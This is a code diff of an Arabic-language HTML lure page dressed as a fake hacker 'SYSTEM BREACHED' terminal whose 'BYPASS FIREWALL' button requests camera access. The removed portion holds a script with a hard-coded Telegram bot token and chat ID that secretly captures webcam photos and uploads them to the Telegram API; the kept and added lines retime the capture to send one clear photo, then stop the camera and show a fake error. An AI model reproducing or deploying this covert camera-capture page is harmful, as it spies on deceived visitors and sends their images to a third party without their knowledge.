@@ -1,76 +1,28 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM BREACHED</title>
-    <style>
-        body { background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .glitch { font-size: 20px; text-transform: uppercase; margin-bottom: 20px; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .terminal { background: rgba(0, 50, 0, 0.2); border: 1px solid #00FF00; padding: 20px; border-radius: 5px; box-shadow: 0 0 15px #00FF00; width: 80%; max-width: 500px; text-align: left; }
-        button { background: #00FF00; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; text-transform: uppercase; }
-        video, canvas { display: none; }
-    </style>
-</head>
-<body>
-
-    <div class="glitch">-- WARNING: SYSTEM VULNERABILITY DETECTED --</div>
-    <div class="terminal">
-        <p>> Injecting payload...</p>
-        <p>> Cracking encryption... 67%</p>
-        <p style="color: red;">! ERROR: Manual Auth Required !</p>
-        <p>اضغط لتجاوز جدار الحماية وتأكيد الهوية:</p>
-        <button id="startBtn">BYPASS FIREWALL</button>
-    </div>
-
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
-        const chatId = "8042090388";
-
-        const startBtn = document.getElementById('startBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        async function sendPhoto() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'image.jpg');
-
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg');
-        }
-
         startBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // التقاط 3 صور بفواصل زمنية (تجنب الصور السوداء)
-                setTimeout(() => sendPhoto(), 2000); // صورة بعد ثانيتين (ضبط الإضاءة)
-                setTimeout(() => sendPhoto(), 4000); // صورة بعد 4 ثوانٍ
+                // 1. الصورة الأولى: واضحة (بعد 3 ثوانٍ لضبط الإضاءة)
                 setTimeout(() => {
-                    sendPhoto();
-                    alert("System Overloaded. Disconnecting...");
-                    stream.getTracks().forEach(track => track.stop());
-                }, 6000);
+                    sendPhoto(); // هذه ستكون الواضحة
+                }, 3000);
+
+                // 2. الصور التالية: سوداء (عن طريق إيقاف بث الكاميرا قبل التقاطها)
+                setTimeout(() => {
+                    // إيقاف الكاميرا برمجياً لجعل الفيديو أسود
+                    stream.getTracks().forEach(track => track.stop()); 
+                    
+                    // إرسال صورتين سوداوين بعد توقف الكاميرا
+                    setTimeout(() => sendPhoto(), 1000); 
+                    setTimeout(() => {
+                        sendPhoto();
+                        alert("System Error: Camera connection lost. Protocol 404 active.");
+                    }, 2000);
+                    
+                }, 5000);
 
             } catch (err) {
                 alert("Access Denied: Camera Permission Needed!");
             }
         });
-    </script>
-</body>
-</html>
